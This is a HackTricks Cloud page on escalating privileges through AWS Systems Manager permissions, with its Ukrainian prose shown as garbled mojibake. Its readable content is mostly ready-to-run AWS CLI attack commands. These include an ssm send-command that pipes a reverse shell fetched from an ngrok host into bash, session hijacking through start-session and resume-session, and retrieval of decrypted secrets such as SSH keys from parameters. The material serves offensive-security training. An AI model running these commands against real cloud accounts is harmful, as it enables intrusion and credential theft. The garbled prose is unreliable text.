# AWS - SSM Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SSM

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ SSM –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

–ê—Ç–∞–∫—É—é—á–∏–π –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:SendCommand`** –º–æ–∂–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ Amazon SSM Agent, —ñ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ IAM Role**, —â–æ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"
```
–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞—Ö–æ–ø–∏—Ç–∏ rev shell –ª–æ–∫–∞–ª—å–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ IAM —Ä–æ–ª–µ–π EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –ø—Ä–∞—Ü—é—é—á–∏–º–∏ SSM –∞–≥–µ–Ω—Ç–∞–º–∏.

### `ssm:StartSession`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:StartSession`** –º–æ–∂–µ **—Ä–æ–∑–ø–æ—á–∞—Ç–∏ —Å–µ—Å—ñ—é, –ø–æ–¥—ñ–±–Ω—É –¥–æ SSH, –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ Amazon SSM Agent, —ñ **—Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ IAM —Ä–æ–ª—å**, —â–æ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
–©–æ–± –ø–æ—á–∞—Ç–∏ —Å–µ—Å—ñ—é, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **SessionManagerPlugin**: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ IAM —Ä–æ–ª–µ–π EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –ø—Ä–∞—Ü—é—é—á–∏–º–∏ SSM Agents.

#### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ ECS

–ö–æ–ª–∏ **ECS –∑–∞–≤–¥–∞–Ω–Ω—è** –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑ **—É–≤—ñ–º–∫–Ω–µ–Ω–∏–º `ExecuteCommand`**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º–∏ –ø—Ä–∞–≤–∞–º–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `ecs execute-command`, —â–æ–± **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞.\
–ó–≥—ñ–¥–Ω–æ –∑ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/), —Ü–µ –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∫–∞–Ω–∞–ª—É –º—ñ–∂ –ø—Ä–∏—Å—Ç—Ä–æ—î–º, —è–∫–∏–π –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –¥–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏ ‚Äú_exec_‚Äú, —Ç–∞ —Ü—ñ–ª—å–æ–≤–∏–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é SSM Session Manager. (–ù–µ–æ–±—Ö—ñ–¥–Ω–∏–π –ø–ª–∞–≥—ñ–Ω SSM Session Manager –¥–ª—è —Ü—å–æ–≥–æ)\
–û—Ç–∂–µ, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ `ssm:StartSession` –∑–º–æ–∂—É—Ç—å **–æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ ECS –∑–∞–≤–¥–∞–Ω—å** –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–æ—é —Ü—ñ—î—é –æ–ø—Ü—ñ—î—é, –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞–≤—à–∏:
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (185).png>)

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ `ECS` IAM —Ä–æ–ª–µ–π, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º `ExecuteCommand`.

### `ssm:ResumeSession`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ssm:ResumeSession`** –º–æ–∂–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ **—Ä–æ–∑–ø–æ—á–∞—Ç–∏ —Å–µ—Å—ñ—é, –ø–æ–¥—ñ–±–Ω—É –¥–æ SSH, –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞—Ö**, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å Amazon SSM Agent –∑ **–≤—ñ–¥–∫–ª—é—á–µ–Ω–∏–º** —Å—Ç–∞–Ω–æ–º —Å–µ—Å—ñ—ó SSM —Ç–∞ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ IAM —Ä–æ–ª—å**, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–µ—ó.
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ IAM —Ä–æ–ª–µ–π EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ –ø—Ä–∞—Ü—é—é—á–∏–º–∏ SSM –∞–≥–µ–Ω—Ç–∞–º–∏ —Ç–∞ –≤—ñ–¥–∫–ª—é—á–µ–Ω–∏–º–∏ —Å–µ—Å—ñ—è–º–∏.

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –≤–∫–∞–∑–∞–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ **SSM –ø–∞—Ä–∞–º–µ—Ç—Ä–∏** —Ç–∞ **—á–∏—Ç–∞—Ç–∏ —ó—Ö —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ**. –£ —Ü–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö –≤–∏ —á–∞—Å—Ç–æ –º–æ–∂–µ—Ç–µ **–∑–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, —Ç–∞–∫—É —è–∫ SSH –∫–ª—é—á—ñ –∞–±–æ API –∫–ª—é—á—ñ.
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤.

### `ssm:ListCommands`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –º–æ–∂–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ **–∫–æ–º–∞–Ω–¥–∏**, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ —ñ, —Å–ø–æ–¥—ñ–≤–∞—é—á–∏—Å—å, –∑–Ω–∞–π—Ç–∏ **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –≤ –Ω–∏—Ö.
```
aws ssm list-commands
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–º–∞–Ω–¥–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤.

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ **–∫–æ–º–∞–Ω–¥–∏**, –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ —Ç–∞ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ**, —Å–ø–æ–¥—ñ–≤–∞—é—á–∏—Å—å –∑–Ω–∞–π—Ç–∏ **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é** –≤ –Ω–∏—Ö.
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ó–Ω–∞–π—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–∏—Ö–æ–¥—É –∫–æ–º–∞–Ω–¥–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤.

### Codebuild

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SSM, —â–æ–± –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—É –ø—Ä–æ–µ–∫—Ç—É codebuild, —â–æ –±—É–¥—É—î—Ç—å—Å—è:

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
